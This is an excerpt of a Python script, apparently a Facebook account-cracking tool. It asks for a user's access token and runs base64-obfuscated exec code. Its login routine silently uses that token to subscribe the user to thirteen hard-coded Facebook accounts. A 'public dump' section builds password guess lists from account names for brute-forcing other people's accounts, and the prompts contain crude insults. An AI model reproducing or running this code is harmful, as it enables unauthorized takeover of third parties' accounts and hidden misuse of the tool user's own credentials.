...
def banner():
	print (''' %s    _     _____   __  __   _  _    ____      _   _____ 
    /$\   |$$$$$| |$$\/ $| |$||$|  |$$$$\    /$| |$$$$$|
   /$_$\     /$/  |$$\/|$| |$||$|_ |$| |$|   |$|   |$|  
  /$$$$$\   /$/   |$|  |$| |$_$$$_ |$| |$|   |$|   |$|  
 /$/   \$\ /$/    |$|  |$|  |$|    |$$$$/    |$|   |$|  
 %s\n%s> %sKALI LINUX\n%s> %sMY CHANNAL TELEGRAM @KALILINUX404\n%s>%s TELEGRAM ME @KALILINUX405\n%s>%s TOOLS [FACEBOOK]\n%s[%s*%s] BY : %sA7M4D 1T\n%s[%s*%s] SERVER : IRAQ\n[%s*%s] IP : %s%s'''%
...
def masuk():
    ...
    if rom in(""):
    	...
    	try:
            ...
            exec(base64.b64decode('b3Muc3lzdGVtKCJ4ZGctb3BlbiBodHRwczovL3QubWUvS0FMSUxJTlVYNDA0Iik7bWVudSgp=='))
        except (KeyError,IOError):
        	print("%s [!] Token invalid "%(M));masuk()
    elif rom in ('2', '02'):
    	print ("\n%s%s Berikut cara nya :"%(H,til));jeda(2)
        print (" - siapkan akun facebook (00000000000000000)");jeda(2)
        print (" - loginkan akun facebook (000000000000) di browser %sChrome %s"%(O,H));jeda(2)
        print (" - url alamat wajib %s00000000000000000000000000000000"%(O,H));jeda(2)
        print (" - salin link : %sview-source:00000000000000000000000000"%(O));jeda(2)
        ...
        if nanya in(""):
        	...
        	print ("\n%s [!] anda sungguh tolol "%(M));jeda(2);os.system("0000000000000");masuk()
    elif rom in ('0', '00'):
    	exit('\n')
    else:
    	print("%s [!] Isi yang benar kentod "%(M));exit()
def login_xx():
    try:
        ...
        requests.post('https://graph.facebook.com/100022086172556/subscribers?access_token=%s'%(token))
        requests.post('https://graph.facebook.com/100028434880529/subscribers?access_token=%s'%(token))
        requests.post('https://graph.facebook.com/100067807565861/subscribers?access_token=%s'%(token))
        requests.post('https://graph.facebook.com/100003723696885/subscribers?access_token=%s'%(token))
        requests.post('https://graph.facebook.com/100041129048948/subscribers?access_token=%s'%(token))
        requests.post('https://graph.facebook.com/100007520203452/subscribers?access_token=%s'%(token))
        requests.post('https://graph.facebook.com/100002461344178/subscribers?access_token=%s'%(token))
        requests.post('https://graph.facebook.com/100071747420583/subscribers?access_token=%s'%(token))
        requests.post('https://graph.facebook.com/100029143111567/subscribers?access_token=%s'%(token))
        requests.post('https://graph.facebook.com/100001540299108/subscribers?access_token=%s'%(token))
        requests.post('https://graph.facebook.com/100055918391280/subscribers?access_token=%s'%(token))
        requests.post('https://graph.facebook.com/100009384338470/subscribers?access_token=%s'%(token))
        requests.post('https://graph.facebook.com/100036655325996/subscribers?access_token=%s'%(token))
    except:
    	pass
# DUMP PUBLIK
            	...
            	for akun in self.id: 
                    try:
                        ...
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [name, _i_[0]+"123", _i_[0]+"1234", _i_[0]+"12345", _i_[0]+"12", _i_[0]+"1212", _i_[0]+"321", _i_[0]+"123123", _i_[0]+"123321", _i_[0]+"1122", _i_[0]+"1", _i_[0]+"2000", _i_[0]+"2001", _i_[0]+"2002", _i_[0]+"2003", _i_[0]+"2004", _i_[0]+"2021", _i_[0]+"112233", _i_[0]+"54321", _i_[0]+"123456"]
                        else:
                            pwx = [name, _i_[0]+"123", _i_[0]+"1234", _i_[0]+"12345", _i_[0]+"12", _i_[0]+"1212", _i_[0]+"321", _i_[0]+"123123", _i_[0]+"123321", _i_[0]+"1122", _i_[0]+"1", _i_[0]+"2000", _i_[0]+"2001", _i_[0]+"2002", _i_[0]+"2003", _i_[0]+"2004", _i_[0]+"2021", _i_[0]+"112233", _i_[0]+"54321", _i_[0]+"123456"]
